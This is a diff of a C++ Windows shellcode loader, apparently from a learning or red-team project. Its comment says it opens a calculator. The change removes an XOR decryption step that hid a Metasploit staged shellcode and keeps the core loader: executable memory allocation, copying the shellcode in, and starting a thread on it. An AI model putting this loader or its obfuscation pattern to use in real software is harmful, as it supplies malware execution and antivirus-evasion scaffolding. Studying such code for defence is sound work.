@@ -1,22 +1,13 @@
 // This program's goal is to try to create a new process to execute a shellcode that will open a calculator
 
 #include <windows.h>
-#include "xored_staged_shellcode.hpp"
-
-// This function will xor the payload with the key in order to decrypt it
-void decrypt_payload(unsigned char* payload, unsigned int payload_size, unsigned char key[], unsigned int key_size)
-{
-	for (unsigned int i = 0; i < payload_size; i++)
-	{
-		payload[i] ^= key[i % key_size];
-	}
-}
+#include "shellcode.hpp"
 
 int main()
 {
 	// Allocate the memory
 	void* memory = VirtualAlloc(nullptr,
-								sizeof(xored_metasploit_staged_shellcode),
+								sizeof(shellcode),
 								MEM_COMMIT,
 								PAGE_EXECUTE_READWRITE);
 
@@ -27,11 +18,8 @@ int main()
 
 	// Move the shellcode to the allocated memory
 	memcpy(memory,
-		   xored_metasploit_staged_shellcode,
-		   sizeof(xored_metasploit_staged_shellcode));
-
-	// Decrypt the payload
-	decrypt_payload((unsigned char*) memory, sizeof(xored_metasploit_staged_shellcode), key, sizeof(key));
+		   shellcode,
+		   sizeof(shellcode));
 
 	// Create a thread pointing to the shellcode address
 	HANDLE thread =	CreateThread(nullptr,
